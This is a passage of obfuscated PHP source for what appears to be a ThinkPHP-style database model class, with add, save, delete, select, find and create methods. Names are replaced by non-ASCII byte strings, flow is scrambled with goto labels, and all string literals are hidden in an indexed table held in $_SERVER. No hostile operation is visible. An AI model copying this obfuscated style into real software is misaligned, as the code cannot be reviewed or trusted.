$this->db->setModel($this->name); $Bçõ‚‚›°ó = $this->db->getFields($this->getTableName()); goto cÚƒî‰ù–¦; cÚƒî‰ù–¦: if (!$Bçõ‚‚›°ó) { return !1; } $this->fields = array_keys($Bçõ‚‚›°ó); $this->fields[$Fò”†ââõÄ[242]] = !1; goto Fî‰†½¥ÁØ; E¥Ãø”ÉÖ: } public function switchModel($dù—ƒ–Ïø, $C¼‹Ş¤†’Û = array()) { $e’óÖ„±¾Ş =& $_SERVER[İë¬“ÅÒÛ›]; $Eºñéá”ÖÏ = ucwords(strtolower($dù—ƒ–Ïø)) . $e’óÖ„±¾Ş[245]; if (!class_exists($Eºñéá”ÖÏ)) { think_exception($Eºñéá”ÖÏ . think_lang($e’óÖ„±¾Ş[246])); } $this->_extModel = new $Eºñéá”ÖÏ($this->name); if (!empty($C¼‹Ş¤†’Û)) { foreach ($C¼‹Ş¤†’Û as $dÌá½ã‹¤) { $this->_extModel->setProperty($dÌá½ã‹¤, $this->{$dÌá½ã‹¤}); } } return $this->_extModel; } public function __set($E»Òìš¾á, $f³µŞÒ«Ì) { $this->data[$E»Òìš¾á] = $f³µŞÒ«Ì; } public function __get($C‡Èßéö…) { return isset($this->data[$C‡Èßéö…]) ? $this->data[$C‡Èßéö…] : null; } public function __isset($cƒ¿õÁŠ ) { return isset($this->data[$cƒ¿õÁŠ ]); } public function __unset($eˆ×´ƒ“¶µ) { unset($this->data[$eˆ×´ƒ“¶µ]); } public function __call($e–±…çËŠ, $D„¡²–‘­´) { $A‹ĞÄ§ç =& $_SERVER[İë¬“ÅÒÛ›]; if (in_array(strtolower($e–±…çËŠ), $this->methods, !0)) { $this->options[strtolower($e–±…çËŠ)] = $D„¡²–‘­´[0]; return $this; } elseif (in_array(strtolower($e–±…çËŠ), array($A‹ĞÄ§ç[247], $A‹ĞÄ§ç[248], $A‹ĞÄ§ç[249], $A‹ĞÄ§ç[250], $A‹ĞÄ§ç[251]), !0)) { $CÕ’¨Ë—‰ = isset($D„¡²–‘­´[0]) ? $D„¡²–‘­´[0] : $A‹ĞÄ§ç[173]; $CÕ’¨Ë—‰ = $this->db->parseKey($CÕ’¨Ë—‰); return $this->getField(strtoupper($e–±…çËŠ) . $A‹ĞÄ§ç[252] . $CÕ’¨Ë—‰ . $A‹ĞÄ§ç[253] . $e–±…çËŠ, $A‹ĞÄ§ç[247]); } elseif (strtolower(substr($e–±…çËŠ, 0, 5)) == $A‹ĞÄ§ç[254]) { $CÕ’¨Ë—‰ = think_parse_name(substr($e–±…çËŠ, 5)); $C¨‘â ¤ãÏ[$CÕ’¨Ë—‰] = $D„¡²–‘­´[0]; return $this->where($C¨‘â ¤ãÏ)->find(); } elseif (strtolower(substr($e–±…çËŠ, 0, 10)) == $A‹ĞÄ§ç[255]) { $B‹É–ì´î = think_parse_name(substr($e–±…çËŠ, 10)); $C¨‘â ¤ãÏ[$B‹É–ì´î] = $D„¡²–‘­´[0]; return $this->where($C¨‘â ¤ãÏ)->getField($D„¡²–‘­´[1]); } elseif (isset($this->_scope[$e–±…çËŠ])) { return $this->scope($e–±…çËŠ, $D„¡²–‘­´[0]); } elseif (method_exists($this, $e–±…çËŠ)) { array_unshift($D„¡²–‘­´, $e–±…çËŠ); return call_user_func_array(array($this, $A‹ĞÄ§ç[256]), $D„¡²–‘­´); } else { return call_user_func_array(array(parent, $e–±…çËŠ), $D„¡²–‘­´); } } protected function call() { goto e¹‘éí­¡; e¹ÍÑØ÷»: $båŒÓº°¾Ú[] = $CÛ®¯¨çĞ; if (method_exists($this, $Cíæ‘¬À ƒ[258])) { $cŠñ†œ¡ = call_user_func_array(array($this, $Cíæ‘¬À ƒ[259]), array($F…ƒ¿îÏ—, $båŒÓº°¾Ú)); if (!is_null($cŠñ†œ¡) && $cŠñ†œ¡ !== !1) { return $cŠñ†œ¡; } } $E‘¸ÔŞŞ› = call_user_func_array(array($this, $CÛ®¯¨çĞ), $båŒÓº°¾Ú); goto dİø’Ñ¦…Á; CÂ×Ÿ¸Œ«ƒ: $F…ƒ¿îÏ— = $CÛ®¯¨çĞ; if (is_array($CÛ®¯¨çĞ)) { $F…ƒ¿îÏ— = $CÛ®¯¨çĞ[1]; $CÛ®¯¨çĞ = $CÛ®¯¨çĞ[0]; } if ($båŒÓº°¾Ú[count($båŒÓº°¾Ú) - 1] === $CÛ®¯¨çĞ) { think_exception(__CLASS__ . $Cíæ‘¬À ƒ[4] . $CÛ®¯¨çĞ . think_lang($Cíæ‘¬À ƒ[257])); return; } goto e¹ÍÑØ÷»; dİø’Ñ¦…Á: if (method_exists($this, $Cíæ‘¬À ƒ[260])) { $cŠñ†œ¡ = call_user_func_array(array($this, $Cíæ‘¬À ƒ[261]), array($F…ƒ¿îÏ—, $båŒÓº°¾Ú, $E‘¸ÔŞŞ›)); if ($cŠñ†œ¡) { return $cŠñ†œ¡; } } return $E‘¸ÔŞŞ›; goto fÄ‘†Æ°Áã; e¹‘éí­¡: $Cíæ‘¬À ƒ =& $_SERVER[İë¬“ÅÒÛ›]; $båŒÓº°¾Ú = func_get_args(); $CÛ®¯¨çĞ = array_shift($båŒÓº°¾Ú); goto CÂ×Ÿ¸Œ«ƒ; fÄ‘†Æ°Áã: } protected function _initialize() { } protected function _facade($eÖŒ¨¼“–) { $DæÖîëƒ‰ğ =& $_SERVER[İë¬“ÅÒÛ›]; if (!empty($this->fields)) { foreach ($eÖŒ¨¼“– as $E‚…êÁØ => $d‚Å’ñØµ) { if (!in_array($E‚…êÁØ, $this->fields, !0)) { unset($eÖŒ¨¼“–[$E‚…êÁØ]); } elseif (is_scalar($d‚Å’ñØµ)) { $this->_parseType($eÖŒ¨¼“–, $E‚…êÁØ); } } } if (!empty($this->options[$DæÖîëƒ‰ğ[262]])) { $eÖŒ¨¼“– = array_map($this->options[$DæÖîëƒ‰ğ[262]], $eÖŒ¨¼“–); unset($this->options[$DæÖîëƒ‰ğ[262]]); } $this->_beforeWrite($eÖŒ¨¼“–); return $eÖŒ¨¼“–; } protected function _beforeWrite(&$F”×†‹Õõª) { } public function add($aÎ¤¸İ¾Š‹ = '', $cÉëòÓ¡èá = array(), $bâÎìÍø¦ƒ = false) { goto C¤¼Õš–¶»; F™ß±¨İá: if (!1 === $this->_beforeInsert($aÎ¤¸İ¾Š‹, $cÉëòÓ¡èá)) { return !1; } $AùÆêÏ»å = $this->db->insert($aÎ¤¸İ¾Š‹, $cÉëòÓ¡èá, $bâÎìÍø¦ƒ); if (!1 !== $AùÆêÏ»å) { $a­êé×–œ© = $this->getLastInsID(); if ($a­êé×–œ©) { $aÎ¤¸İ¾Š‹[$this->getPk()] = $a­êé×–œ©; $this->_after_insert($aÎ¤¸İ¾Š‹, $cÉëòÓ¡èá); return $a­êé×–œ©; } $this->_after_insert($aÎ¤¸İ¾Š‹, $cÉëòÓ¡èá); } goto Aóİ—ÉÂô¼; C¤¼Õš–¶»: if (empty($aÎ¤¸İ¾Š‹)) { if (!empty($this->data)) { $aÎ¤¸İ¾Š‹ = $this->data; $this->data = array(); } else { $this->error = think_lang($_SERVER[İë¬“ÅÒÛ›][263]); return !1; } } $cÉëòÓ¡èá = $this->_parseOptions($cÉëòÓ¡èá); $aÎ¤¸İ¾Š‹ = $this->_facade($aÎ¤¸İ¾Š‹); goto F™ß±¨İá; Aóİ—ÉÂô¼: return $AùÆêÏ»å; goto dïÖæŸòà“; dïÖæŸòà“: } protected function _beforeInsert(&$fÁîÇ¡¿–š, $eĞÖÕ¥„´è) { } protected function _after_insert($F‡›¢Šõ¿É, $fî²®ÄÊèß) { } public function addAll($EÄÙåÌ­óˆ, $Bè©‡÷áÛ = array(), $fêäË£Û¢ = false) { goto E”—¸ÚÓ¡Å; E”—¸ÚÓ¡Å: $d¶“²—åí =& $_SERVER[İë¬“ÅÒÛ›]; if (empty($EÄÙåÌ­óˆ)) { $this->error = think_lang($d¶“²—åí[263]); return !1; } $Bè©‡÷áÛ = $this->_parseOptions($Bè©‡÷áÛ); goto BãĞï®¡’ç; BãĞï®¡’ç: foreach ($EÄÙåÌ­óˆ as $aÆ……ÚÈ‘ => $bãØÎøôÒ†) { $EÄÙåÌ­óˆ[$aÆ……ÚÈ‘] = $this->_facade($bãØÎøôÒ†); } if (method_exists($this->db, $d¶“²—åí[264])) { $e°®ø¸›™¾ = $this->db->insertAll($EÄÙåÌ­óˆ, $Bè©‡÷áÛ, $fêäË£Û¢); } else { $this->startTrans(); foreach ($EÄÙåÌ­óˆ as $aÆ……ÚÈ‘ => $bãØÎøôÒ†) { $e°®ø¸›™¾ = $this->db->insert($bãØÎøôÒ†, $Bè©‡÷áÛ, $fêäË£Û¢); } $this->commit(); } if (!1 !== $e°®ø¸›™¾) { $EºÓù¡©õ‡ = $this->getLastInsID(); if ($EºÓù¡©õ‡) { return $EºÓù¡©õ‡; } } goto a¦Ñé‘†·; a¦Ñé‘†·: return $e°®ø¸›™¾; goto e¹Ì¾ğĞ¯; e¹Ì¾ğĞ¯: } public function selectAdd($Dàóìôóìä = '', $aÉØ×‚ïö… = '', $AŸ”¥¢¸í¾ = array()) { $CÁ¸»µ£Ì§ =& $_SERVER[İë¬“ÅÒÛ›]; $AŸ”¥¢¸í¾ = $this->_parseOptions($AŸ”¥¢¸í¾); if (!1 === ($DÊ©ºÆï = $this->db->selectInsert($Dàóìôóìä ? $Dàóìôóìä : $AŸ”¥¢¸í¾[$CÁ¸»µ£Ì§[265]], $aÉØ×‚ïö… ? $aÉØ×‚ïö… : $this->getTableName(), $AŸ”¥¢¸í¾))) { $this->error = think_lang($CÁ¸»µ£Ì§[266]); return !1; } else { return $DÊ©ºÆï; } } public function save($f´ß¨ÃƒŞÈ = '', $d¿ƒĞ‰ĞªŒ = array()) { goto eòµº‡äãô; fø°Ö™ìäá: if (!1 !== $DƒÍ—ÅâŸĞ) { if (isset($F›¥Âö£ï)) { $f´ß¨ÃƒŞÈ[$F‡™’¹™©] = $F›¥Âö£ï; } $this->_afterUpdate($f´ß¨ÃƒŞÈ, $d¿ƒĞ‰ĞªŒ); } return $DƒÍ—ÅâŸĞ; goto dĞÔ·—Óã½; B¬ò«„¿ÙÉ: if (is_array($d¿ƒĞ‰ĞªŒ[$Bé°×ÁğÖÁ[267]]) && isset($d¿ƒĞ‰ĞªŒ[$Bé°×ÁğÖÁ[267]][$F‡™’¹™©])) { $F›¥Âö£ï = $d¿ƒĞ‰ĞªŒ[$Bé°×ÁğÖÁ[267]][$F‡™’¹™©]; } if (!1 === $this->_beforeUpdate($f´ß¨ÃƒŞÈ, $d¿ƒĞ‰ĞªŒ)) { return !1; } $DƒÍ—ÅâŸĞ = $this->db->update($f´ß¨ÃƒŞÈ, $d¿ƒĞ‰ĞªŒ); goto fø°Ö™ìäá; eòµº‡äãô: $Bé°×ÁğÖÁ =& $_SERVER[İë¬“ÅÒÛ›]; if (empty($f´ß¨ÃƒŞÈ)) { if (!empty($this->data)) { $f´ß¨ÃƒŞÈ = $this->data; $this->data = array(); } else { $this->error = think_lang($Bé°×ÁğÖÁ[263]); return !1; } } $f´ß¨ÃƒŞÈ = $this->_facade($f´ß¨ÃƒŞÈ); goto cĞ´¡‚¹ø×; cĞ´¡‚¹ø×: $d¿ƒĞ‰ĞªŒ = $this->_parseOptions($d¿ƒĞ‰ĞªŒ); $F‡™’¹™© = $this->getPk(); if (!isset($d¿ƒĞ‰ĞªŒ[$Bé°×ÁğÖÁ[267]])) { if (isset($f´ß¨ÃƒŞÈ[$F‡™’¹™©])) { $B™ÕÃËŸƒ[$F‡™’¹™©] = $f´ß¨ÃƒŞÈ[$F‡™’¹™©]; $d¿ƒĞ‰ĞªŒ[$Bé°×ÁğÖÁ[267]] = $B™ÕÃËŸƒ; unset($f´ß¨ÃƒŞÈ[$F‡™’¹™©]); } else { $this->error = think_lang($Bé°×ÁğÖÁ[266]); return !1; } } goto B¬ò«„¿ÙÉ; dĞÔ·—Óã½: } protected function _beforeUpdate(&$CØó‰ä·ÀÕ, $cÛ ´ÑËØ…) { } protected function _afterUpdate($dà†í…”¿‰, $fî¨Ô¡“’â) { } public function delete($aœ›„îØë = array()) { goto dæãóÇ·¾á; dæãóÇ·¾á: $EôóÙâŠ† =& $_SERVER[İë¬“ÅÒÛ›]; if (empty($aœ›„îØë) && empty($this->options[$EôóÙâŠ†[267]])) { if (!empty($this->data) && isset($this->data[$this->getPk()])) { return $this->delete($this->data[$this->getPk()]); } else { return !1; } } $bÅ„†‘í—® = $this->getPk(); goto BáËÍõó¾Õ; BáËÍõó¾Õ: if (is_numeric($aœ›„îØë) || is_string($aœ›„îØë)) { if (strpos($aœ›„îØë, $EôóÙâŠ†[47])) { $A¥¤¾ÏÀ‡œ[$bÅ„†‘í—®] = array($EôóÙâŠ†[268], $aœ›„îØë); } else { $A¥¤¾ÏÀ‡œ[$bÅ„†‘í—®] = $aœ›„îØë; } $this->options[$EôóÙâŠ†[267]] = $A¥¤¾ÏÀ‡œ; } $aœ›„îØë = $this->_parseOptions(); if (is_array($aœ›„îØë[$EôóÙâŠ†[267]]) && isset($aœ›„îØë[$EôóÙâŠ†[267]][$bÅ„†‘í—®])) { $eÎæë„ğ¸÷ = $aœ›„îØë[$EôóÙâŠ†[267]][$bÅ„†‘í—®]; } goto DÏÂ¨†Ş†Ã; DÏÂ¨†Ş†Ã: $C™ïóÒ®ŠÁ = $this->db->delete($aœ›„îØë); if (!1 !== $C™ïóÒ®ŠÁ) { $C™ÉÈÇÆ‡“ = array(); if (isset($eÎæë„ğ¸÷)) { $C™ÉÈÇÆ‡“[$bÅ„†‘í—®] = $eÎæë„ğ¸÷; } $this->_after_delete($C™ÉÈÇÆ‡“, $aœ›„îØë); } return $C™ïóÒ®ŠÁ; goto FÇôåŒğ³Ö; FÇôåŒğ³Ö: } protected function _after_delete($dâš’¥ˆÔ, $A‘è›ô•™´) { } public function select($D¥Àí¬Ãƒ£ = array()) { goto e’ß¯¡›¶·; d†±êë›ö…: $this->_afterSelect($FŞÄÎ£ĞŞ·, $D¥Àí¬Ãƒ£); return $FŞÄÎ£ĞŞ·; goto b—·‘äİ´¦; bšŸ¤†ïª¤: $FŞÄÎ£ĞŞ· = $this->db->select($D¥Àí¬Ãƒ£); if (!1 === $FŞÄÎ£ĞŞ·) { return !1; } if (empty($FŞÄÎ£ĞŞ·)) { return null; } goto d†±êë›ö…; e’ß¯¡›¶·: $a‰åäï¢àÑ =& $_SERVER[İë¬“ÅÒÛ›]; if (is_string($D¥Àí¬Ãƒ£) || is_numeric($D¥Àí¬Ãƒ£)) { $Bµ”ªÛ£å” = $this->getPk(); if (strpos($D¥Àí¬Ãƒ£, $a‰åäï¢àÑ[47])) { $aò¡ò¥¹ó[$Bµ”ªÛ£å”] = array($a‰åäï¢àÑ[268], $D¥Àí¬Ãƒ£); } else { $aò¡ò¥¹ó[$Bµ”ªÛ£å”] = $D¥Àí¬Ãƒ£; } $this->options[$a‰åäï¢àÑ[267]] = $aò¡ò¥¹ó; } elseif (!1 === $D¥Àí¬Ãƒ£) { $D¥Àí¬Ãƒ£ = $this->_parseOptions(); return $a‰åäï¢àÑ[269] . $this->db->buildSelectSql($D¥Àí¬Ãƒ£) . $a‰åäï¢àÑ[270]; } $D¥Àí¬Ãƒ£ = $this->_parseOptions(); goto bšŸ¤†ïª¤; b—·‘äİ´¦: } protected function _afterSelect(&$d­ò…‘äù, $f÷ÂóÆÀ³Á) { } public function buildSql($c»¸Ş‚Ü = array()) { $aŸñå°Ñ =& $_SERVER[İë¬“ÅÒÛ›]; $c»¸Ş‚Ü = $this->_parseOptions($c»¸Ş‚Ü); return $aŸñå°Ñ[269] . $this->db->buildSelectSql($c»¸Ş‚Ü) . $aŸñå°Ñ[270]; } public function optionsValue($cÀù¦¢ã¢ = null) { if (is_null($cÀù¦¢ã¢)) { return $this->options; } elseif (is_array($cÀù¦¢ã¢)) { $this->options = array_merge($this->options, $cÀù¦¢ã¢); } } protected function _parseOptions($a‰Ğ™ƒÚ = array()) { goto b‚ŠÔôµÄ; Cç¢Ãª×ñ¶: if (isset($a‰Ğ™ƒÚ[$a¥˜˜ì°À£[267]]) && is_array($a‰Ğ™ƒÚ[$a¥˜˜ì°À£[267]]) && !empty($BÙ·±ƒ á) && !isset($a‰Ğ™ƒÚ[$a¥˜˜ì°À£[274]]) && !isset($a‰Ğ™ƒÚ[$a¥˜˜ì°À£[271]])) { foreach ($a‰Ğ™ƒÚ[$a¥˜˜ì°À£[267]] as $eÑµ—âİÙ‹ => $CµØ‹ßÓ ç) { $eÑµ—âİÙ‹ = trim($eÑµ—âİÙ‹); if (in_array($eÑµ—âİÙ‹, $BÙ·±ƒ á, !0)) { if (is_scalar($CµØ‹ßÓ ç)) { $this->_parseType($a‰Ğ™ƒÚ[$a¥˜˜ì°À£[267]], $eÑµ—âİÙ‹); } } elseif (!is_numeric($eÑµ—âİÙ‹) && $a¥˜˜ì°À£[71] != substr($eÑµ—âİÙ‹, 0, 1) && !1 === strpos($eÑµ—âİÙ‹, $a¥˜˜ì°À£[92]) && !1 === strpos($eÑµ—âİÙ‹, $a¥˜˜ì°À£[252]) && !1 === strpos($eÑµ—âİÙ‹, $a¥˜˜ì°À£[275]) && !1 === strpos($eÑµ—âİÙ‹, $a¥˜˜ì°À£[276])) { unset($a‰Ğ™ƒÚ[$a¥˜˜ì°À£[267]][$eÑµ—âİÙ‹]); } } } $this->_options_filter($a‰Ğ™ƒÚ); return $a‰Ğ™ƒÚ; goto f–Ï†«Å°; b‚ŠÔôµÄ: $a¥˜˜ì°À£ =& $_SERVER[İë¬“ÅÒÛ›]; if (is_array($a‰Ğ™ƒÚ)) { $a‰Ğ™ƒÚ = array_merge($this->options, $a‰Ğ™ƒÚ); } $this->options = array(); goto bŸÀ¿Ï®´; bŸÀ¿Ï®´: if (!isset($a‰Ğ™ƒÚ[$a¥˜˜ì°À£[271]])) { $a‰Ğ™ƒÚ[$a¥˜˜ì°À£[271]] = $this->getTableName(); $BÙ·±ƒ á = $this->fields; } else { $BÙ·±ƒ á = $this->getDbFields(); } if (!empty($a‰Ğ™ƒÚ[$a¥˜˜ì°À£[272]])) { $a‰Ğ™ƒÚ[$a¥˜˜ì°À£[271]] .= $a¥˜˜ì°À£[50] . $a‰Ğ™ƒÚ[$a¥˜˜ì°À£[272]]; } $a‰Ğ™ƒÚ[$a¥˜˜ì°À£[273]] = $this->name; goto Cç¢Ãª×ñ¶; f–Ï†«Å°: } protected function _options_filter(&$D‘ê¡ÍÀ§) { } protected function _parseType(&$eİÄÏ¯èÇİ, $Fç­¨³Ó¸) { $Bï¸™÷¥±î =& $_SERVER[İë¬“ÅÒÛ›]; if (empty($this->options[$Bï¸™÷¥±î[277]][$Bï¸™÷¥±î[4] . $Fç­¨³Ó¸])) { $föŠ«¿²Úì = strtolower($this->fields[$Bï¸™÷¥±î[244]][$Fç­¨³Ó¸]); if (!1 !== strpos($föŠ«¿²Úì, $Bï¸™÷¥±î[278])) { } elseif (!1 === strpos($föŠ«¿²Úì, $Bï¸™÷¥±î[279]) && !1 !== strpos($föŠ«¿²Úì, $Bï¸™÷¥±î[280])) { $eİÄÏ¯èÇİ[$Fç­¨³Ó¸] = intval($eİÄÏ¯èÇİ[$Fç­¨³Ó¸]); } elseif (!1 !== strpos($föŠ«¿²Úì, $Bï¸™÷¥±î[281]) || !1 !== strpos($föŠ«¿²Úì, $Bï¸™÷¥±î[282])) { $eİÄÏ¯èÇİ[$Fç­¨³Ó¸] = floatval($eİÄÏ¯èÇİ[$Fç­¨³Ó¸]); } elseif (!1 !== strpos($föŠ«¿²Úì, $Bï¸™÷¥±î[283])) { $eİÄÏ¯èÇİ[$Fç­¨³Ó¸] = (bool) $eİÄÏ¯èÇİ[$Fç­¨³Ó¸]; } } } public function find($D‚Ñ¢¼ïç = array()) { goto A¨•©Ã—¬Ò; fÏ¯¸°¼–: if (empty($fš§÷Õ£¦)) { return null; } $this->data = $fš§÷Õ£¦[0]; $this->_afterFind($this->data, $D‚Ñ¢¼ïç); goto bÊâåá«ŠÙ; fÍîù¨ÅŠ: $D‚Ñ¢¼ïç = $this->_parseOptions(); $fš§÷Õ£¦ = $this->db->select($D‚Ñ¢¼ïç); if (!1 === $fš§÷Õ£¦) { return !1; } goto fÏ¯¸°¼–; A¨•©Ã—¬Ò: $A¿ÛŒ…–œ© =& $_SERVER[İë¬“ÅÒÛ›]; if (is_numeric($D‚Ñ¢¼ïç) || is_string($D‚Ñ¢¼ïç)) { $cÒº†”çîæ[$this->getPk()] = $D‚Ñ¢¼ïç; $this->options[$A¿ÛŒ…–œ©[267]] = $cÒº†”çîæ; } $this->options[$A¿ÛŒ…–œ©[284]] = 1; goto fÍîù¨ÅŠ; bÊâåá«ŠÙ: if (!empty($this->options[$A¿ÛŒ…–œ©[285]])) { return $this->returnResult($this->data, $this->options[$A¿ÛŒ…–œ©[285]]); } return $this->data; goto a±ô£¤ùî£; a±ô£¤ùî£: } protected function _afterFind(&$f‹ïÖ¥Ñ—, $dóİ‘½”éÍ) { } protected function returnResult($E˜¦‹÷æ ó, $E¯Ö«ßÕ‰¿ = '') { $a—éÁÑ‰ÙŒ =& $_SERVER[İë¬“ÅÒÛ›]; if ($E¯Ö«ßÕ‰¿) { if (is_callable($E¯Ö«ßÕ‰¿)) { return call_user_func($E¯Ö«ßÕ‰¿, $E˜¦‹÷æ ó); } switch (strtolower($E¯Ö«ßÕ‰¿)) { case $a—éÁÑ‰ÙŒ[286]: return json_encode($E˜¦‹÷æ ó); case $a—éÁÑ‰ÙŒ[287]: return xml_encode($E˜¦‹÷æ ó); } } return $E˜¦‹÷æ ó; } public function parseFieldsMap($dÊœ¿Úò¤Í, $D¹¨ÒŒÉ¸ = 1) { if (!empty($this->_map)) { foreach ($this->_map as $fà¬§„Ğ˜Ò => $dëÍ­¶ìÉì) { if ($D¹¨ÒŒÉ¸ == 1) { if (isset($dÊœ¿Úò¤Í[$dëÍ­¶ìÉì])) { $dÊœ¿Úò¤Í[$fà¬§„Ğ˜Ò] = $dÊœ¿Úò¤Í[$dëÍ­¶ìÉì]; unset($dÊœ¿Úò¤Í[$dëÍ­¶ìÉì]); } } else { if (isset($dÊœ¿Úò¤Í[$fà¬§„Ğ˜Ò])) { $dÊœ¿Úò¤Í[$dëÍ­¶ìÉì] = $dÊœ¿Úò¤Í[$fà¬§„Ğ˜Ò]; unset($dÊœ¿Úò¤Í[$fà¬§„Ğ˜Ò]); } } } } return $dÊœ¿Úò¤Í; } public function setField($CÇŸôïÊ, $dÌ·µ˜¿¹¥ = '') { if (is_array($CÇŸôïÊ)) { $Dî¤´•‚¾— = $CÇŸôïÊ; } else { $Dî¤´•‚¾—[$CÇŸôïÊ] = $dÌ·µ˜¿¹¥; } return $this->save($Dî¤´•‚¾—); } public function setAdd($D œŞ„ê, $E”š¨¼ö÷ = 1) { $bçƒÁÀøÎ¬ =& $_SERVER[İë¬“ÅÒÛ›]; $D¹ñÂáË… = $D œŞ„ê . $bçƒÁÀøÎ¬[288] . $E”š¨¼ö÷; if ($E”š¨¼ö÷ < 0) { $D¹ñÂáË… = $D œŞ„ê . $E”š¨¼ö÷; } return $this->setField($D œŞ„ê, array($bçƒÁÀøÎ¬[289], $D¹ñÂáË…)); } public function getField($fíçÉÖÛ‘µ, $Aˆ™Î¦¼Æö = null) { $CèÌÚ„Ä¼ =& $_SERVER[İë¬“ÅÒÛ›]; $Có¶µšöñ°[$CèÌÚ„Ä¼[265]] = $fíçÉÖÛ‘µ; $Có¶µšöñ° = $this->_parseOptions($Có¶µšöñ°); $fíçÉÖÛ‘µ = trim($fíçÉÖÛ‘µ); if (strpos($fíçÉÖÛ‘µ, $CèÌÚ„Ä¼[47])) { if (!isset($Có¶µšöñ°[$CèÌÚ„Ä¼[284]])) { $Có¶µšöñ°[$CèÌÚ„Ä¼[284]] = is_numeric($Aˆ™Î¦¼Æö) ? $Aˆ™Î¦¼Æö : $CèÌÚ„Ä¼[33]; } $A·éƒ…Î’É = $this->db->select($Có¶µšöñ°); if (!empty($A·éƒ…Î’É)) { goto DÍ †é¡¦ï; a‰¦³‚Äï: foreach ($A·éƒ…Î’É as $b‹´ë±´Ì) { $fè’ìøŸ¤ = $b‹´ë±´Ì[$Fğø‹ïˆöİ]; if (2 == $dÉ™Ø’”Ü) { $C˜‘ŸÌÜÁá[$fè’ìøŸ¤] = $b‹´ë±´Ì[$eùŠéÕ²¸Œ]; } else { $C˜‘ŸÌÜÁá[$fè’ìøŸ¤] = is_string($Aˆ™Î¦¼Æö) ? implode($Aˆ™Î¦¼Æö, $b‹´ë±´Ì) : $b‹´ë±´Ì; } } return $C˜‘ŸÌÜÁá; goto dº’˜´í°‚; dùâíÉŒ¦é: $eùŠéÕ²¸Œ = array_shift($fíçÉÖÛ‘µ); $C˜‘ŸÌÜÁá = array(); $dÉ™Ø’”Ü = count($f·ª¥íÊñ·); goto a‰¦³‚Äï; DÍ †é¡¦ï: $f·ª¥íÊñ· = explode($CèÌÚ„Ä¼[47], $fíçÉÖÛ‘µ); $fíçÉÖÛ‘µ = array_keys($A·éƒ…Î’É[0]); $Fğø‹ïˆöİ = array_shift($fíçÉÖÛ‘µ); goto dùâíÉŒ¦é; dº’˜´í°‚: } } else { if (!0 !== $Aˆ™Î¦¼Æö) { $Có¶µšöñ°[$CèÌÚ„Ä¼[284]] = is_numeric($Aˆ™Î¦¼Æö) ? $Aˆ™Î¦¼Æö : 1; } if ($Aˆ™Î¦¼Æö === $CèÌÚ„Ä¼[247]) { unset($Có¶µšöñ°[$CèÌÚ„Ä¼[284]]); } $b‹´ë±´Ì = $this->db->select($Có¶µšöñ°); if (!empty($b‹´ë±´Ì)) { if ($Aˆ™Î¦¼Æö === $CèÌÚ„Ä¼[247]) { return reset($b‹´ë±´Ì[0]); } if (!0 !== $Aˆ™Î¦¼Æö && 1 == $Có¶µšöñ°[$CèÌÚ„Ä¼[284]]) { return reset($b‹´ë±´Ì[0]); } foreach ($b‹´ë±´Ì as $f²ÑÀ¸¡´ö) { $C×Í°ëÚ§[] = $f²ÑÀ¸¡´ö[$fíçÉÖÛ‘µ]; } return $C×Í°ëÚ§; } } return null; } public function create($b¾²ŞŠ¤Äµ = '', $EëÒ¹ÕÂó = '') { goto d¤ïÏ÷Ø«ê; cÊôá”Á”·: if (isset($Cªˆ¦Œ­¿)) { if (is_string($Cªˆ¦Œ­¿)) { $Cªˆ¦Œ­¿ = explode($cÜ«—›ªÚß[47], $Cªˆ¦Œ­¿); } if (think_config($cÜ«—›ªÚß[290])) { $Cªˆ¦Œ­¿[] = think_config($cÜ«—›ªÚß[291]); } foreach ($b¾²ŞŠ¤Äµ as $EòŞí—ÀÚº => $Bˆ‚µæŸ³ƒ) { if (!in_array($EòŞí—ÀÚº, $Cªˆ¦Œ­¿)) { unset($b¾²ŞŠ¤Äµ[$EòŞí—ÀÚº]); } } } if (!$this->autoValidation($b¾²ŞŠ¤Äµ, $EëÒ¹ÕÂó)) { return !1; } if (!$this->autoCheckToken($b¾²ŞŠ¤Äµ)) { $this->error = think_lang($cÜ«—›ªÚß[292]); return !1; } goto Dœ“¦˜“Ãá; d¤ïÏ÷Ø«ê: $cÜ«—›ªÚß =& $_SERVER[İë¬“ÅÒÛ›]; if (empty($b¾²ŞŠ¤Äµ)) { $b¾²ŞŠ¤Äµ = $_POST; } elseif (is_object($b¾²ŞŠ¤Äµ)) { $b¾²ŞŠ¤Äµ = get_object_vars($b¾²ŞŠ¤Äµ); } if (empty($b¾²ŞŠ¤Äµ) || !is_array($b¾²ŞŠ¤Äµ)) { $this->error = think_lang($cÜ«—›ªÚß[263]); return !1; } goto FŸËƒ•‡á²; FŸËƒ•‡á²: $b¾²ŞŠ¤Äµ = $this->parseFieldsMap($b¾²ŞŠ¤Äµ, 0); $EëÒ¹ÕÂó = $EëÒ¹ÕÂó ? $EëÒ¹ÕÂó : (!empty($b¾²ŞŠ¤Äµ[$this->getPk()]) ? THINK_MODEL_UPDATE : THINK_MODEL_INSERT); if (isset($this->options[$cÜ«—›ªÚß[265]])) { $Cªˆ¦Œ­¿ = $this->options[$cÜ«—›ªÚß[265]]; unset($this->options[$cÜ«—›ªÚß[265]]); } elseif ($EëÒ¹ÕÂó == THINK_MODEL_INSERT && isset($this->insertFields)) { $Cªˆ¦Œ­¿ = $this->insertFields; } elseif ($EëÒ¹ÕÂó == THINK_MODEL_UPDATE && isset($this->updateFields)) { $Cªˆ¦Œ­¿ = $this->updateFields; } goto cÊôá”Á”·; Dœ“¦˜“Ãá: if ($this->autoCheckFields) { $Cªˆ¦Œ­¿ = $this->getDbFields(); foreach ($b¾²ŞŠ¤Äµ as $EòŞí—ÀÚº => $Bˆ‚µæŸ³ƒ) { if (!in_array($EòŞí—ÀÚº, $Cªˆ¦Œ­¿)) { unset($b¾²ŞŠ¤Äµ[$EòŞí—ÀÚº]); } elseif (MAGIC_QUOTES_GPC && is_string($Bˆ‚µæŸ³ƒ)) { $b¾²ŞŠ¤Äµ[$EòŞí—ÀÚº] = stripslashes($Bˆ‚µæŸ³ƒ); } } } $this->autoOperation($b¾²ŞŠ¤Äµ, $EëÒ¹ÕÂó); $this->data = $b¾²ŞŠ¤Äµ; goto FŞ‘›¶øÙÃ; FŞ‘›¶øÙÃ: return $b¾²ŞŠ¤Äµ; goto DÜ³–ö‡é›; DÜ³–ö‡é›: } public function autoCheckToken($AˆˆôºëÆÁ) { $eöñÖ‹¸™è =& $_SERVER[İë¬“ÅÒÛ›]; if (isset($this->options[$eöñÖ‹¸™è[293]]) && !$this->options[$eöñÖ‹¸™è[293]]) { return !0; } if (think_config($eöñÖ‹¸™è[290])) { $DÙ„‚ã®İè = 